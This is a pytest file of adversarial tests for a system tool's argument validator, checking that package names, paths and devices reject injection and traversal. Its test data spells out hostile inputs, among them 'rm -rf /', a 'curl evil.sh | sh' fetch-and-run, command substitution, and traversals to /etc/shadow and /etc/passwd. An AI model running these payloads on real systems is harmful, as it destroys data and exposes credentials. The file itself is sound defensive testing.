"""Adversarial tests for argument validation.

These are the tests CONTRIBUTING.md makes mandatory: every arg type gets a
traversal attempt and an injection attempt.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from hermesctl.validate import (
    ArgSpec,
    ValidationError,
    validate_arg,
)


@pytest.fixture
def home(tmp_path: Path) -> str:
    h = tmp_path / "home" / "sam"
    (h / "docs").mkdir(parents=True)
    (h / "docs" / "note.txt").write_text("hi")
    return str(h)


# ── injection ───────────────────────────────────────────────────────────

INJECTIONS = [
    "vlc; rm -rf /",
    "vlc && curl evil.sh | sh",
    "vlc`whoami`",
    "vlc$(id)",
    "vlc\nrm -rf /",
    "vlc|tee /etc/passwd",
    "vlc > /etc/shadow",
    "../../../bin/sh",
    "vlc\x00rm",
]


@pytest.mark.parametrize("bad", INJECTIONS)
def test_package_name_rejects_injection(bad, home):
    with pytest.raises(ValidationError):
        validate_arg(ArgSpec(type="package_name"), bad, home=home)


@pytest.mark.parametrize("bad", INJECTIONS)
def test_service_name_rejects_injection(bad, home):
    with pytest.raises(ValidationError):
        validate_arg(ArgSpec(type="service_name"), bad, home=home)


def test_package_name_accepts_real_names(home):
    for good in ["vlc", "python3-pip", "lib32z1", "g++", "foo.bar", "a"]:
        assert validate_arg(ArgSpec(type="package_name"), good, home=home) == good


def test_control_characters_rejected_everywhere(home):
    for t in ("package_name", "service_name", "snapshot_name", "text"):
        with pytest.raises(ValidationError):
            validate_arg(ArgSpec(type=t), "ok\x1b[31mred", home=home)


# ── path traversal ──────────────────────────────────────────────────────

TRAVERSALS = [
    "../../../../etc/shadow",
    "docs/../../../etc/passwd",
    "/etc/shadow",
    "~/../../etc/hosts",
    "docs/./../../..",
]


@pytest.mark.parametrize("bad", TRAVERSALS)
def test_user_path_blocks_traversal(bad, home):
    with pytest.raises(ValidationError):
        validate_arg(ArgSpec(type="user_path"), bad, home=home)


def test_user_path_accepts_inside_home(home):
    got = validate_arg(ArgSpec(type="user_path"), f"{home}/docs/note.txt", home=home)
    assert got == str(Path(home).resolve() / "docs" / "note.txt")


def test_user_path_follows_symlink_out_of_home(home, tmp_path):
    """A symlink pointing outside home must fail — resolve BEFORE checking."""
    secret = tmp_path / "secret.txt"
    secret.write_text("nope")
    link = Path(home) / "innocent.txt"
    link.symlink_to(secret)
    with pytest.raises(ValidationError):
        validate_arg(ArgSpec(type="user_path"), str(link), home=home)


def test_user_path_symlinked_parent_dir_out_of_home(home, tmp_path):
    """Traversal via a symlinked directory, not just a symlinked file."""
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "f.txt").write_text("x")
    (Path(home) / "shortcut").symlink_to(outside)
    with pytest.raises(ValidationError):
        validate_arg(ArgSpec(type="user_path"), f"{home}/shortcut/f.txt", home=home)


# ── system paths ────────────────────────────────────────────────────────

@pytest.mark.parametrize(
    "denied",
    [
        "/etc/hermesos/policy.yaml",
        "/etc/hermesos/verbs.d/local/x.yaml",
        "/var/log/hermesos/audit.jsonl",
        "/etc/sudoers",
        "/etc/sudoers.d/hermes",
        "/etc/shadow",
        "/boot/grub/grub.cfg",
        "/usr/lib/hermesos/manifest.sha256",
        "/etc/hermesos/../hermesos/policy.yaml",
    ],
)
def test_system_path_refuses_forbidden(denied, home):
    with pytest.raises(ValidationError):
        validate_arg(ArgSpec(type="system_path"), denied, home=home)


def test_system_path_refuses_outside_allowlist(home):
    for p in ["/bin/sh", "/proc/self/mem", "/sys/power/state", "/dev/sda"]:
        with pytest.raises(ValidationError):
            validate_arg(ArgSpec(type="system_path"), p, home=home)


def test_system_path_allows_ordinary_config(home):
    # Returned path is fully resolved. On macOS /etc is a symlink to
    # /private/etc, so compare against the resolved form rather than the
    # literal input.
    got = validate_arg(ArgSpec(type="system_path"), "/etc/hosts", home=home)
    assert got == str(Path("/etc/hosts").resolve())


def test_forbidden_prefix_not_defeated_by_similar_name(home):
    """/etc/hermesos-notes is NOT /etc/hermesos — prefix match is per-component."""
    got = validate_arg(ArgSpec(type="system_path"), "/etc/hermesos-notes", home=home)
    assert got == str(Path("/etc/hermesos-notes").resolve())
    assert got.endswith("/etc/hermesos-notes")


# ── devices ─────────────────────────────────────────────────────────────

def test_device_requires_by_id(home):
    for bad in ["/dev/sda", "/dev/nvme0n1", "sda", "/dev/../dev/sda"]:
        with pytest.raises(ValidationError):
            validate_arg(ArgSpec(type="device"), bad, home=home)


def test_device_accepts_by_id(home):
    p = "/dev/disk/by-id/usb-Kingston_DataTraveler-0:0"
    assert validate_arg(ArgSpec(type="device"), p, home=home) == p


# ── lists and bounds ────────────────────────────────────────────────────

def test_list_enforces_max_items(home):
    spec = ArgSpec(type="list[package_name]", max_items=3)
    assert validate_arg(spec, ["a", "b", "c"], home=home) == ["a", "b", "c"]
    with pytest.raises(ValidationError):
        validate_arg(spec, ["a", "b", "c", "d"], home=home)


def test_list_rejects_empty_and_non_list(home):
    spec = ArgSpec(type="list[package_name]")
    with pytest.raises(ValidationError):
        validate_arg(spec, [], home=home)
    with pytest.raises(ValidationError):
        validate_arg(spec, "vlc", home=home)


def test_one_bad_item_fails_whole_list(home):
    spec = ArgSpec(type="list[package_name]")
    with pytest.raises(ValidationError):
        validate_arg(spec, ["vlc", "gimp; rm -rf /"], home=home)


def test_int_bounds(home):
    spec = ArgSpec(type="int", minimum=1, maximum=10)
    assert validate_arg(spec, 5, home=home) == 5
    for bad in (0, 11, True, "5", 3.5):
        with pytest.raises(ValidationError):
            validate_arg(spec, bad, home=home)


def test_enum(home):
    spec = ArgSpec(type="enum", choices=("on", "off"))
    assert validate_arg(spec, "on", home=home) == "on"
    with pytest.raises(ValidationError):
        validate_arg(spec, "maybe", home=home)


def test_unknown_type_refused(home):
    with pytest.raises(ValidationError):
        validate_arg(ArgSpec(type="anything"), "x", home=home)
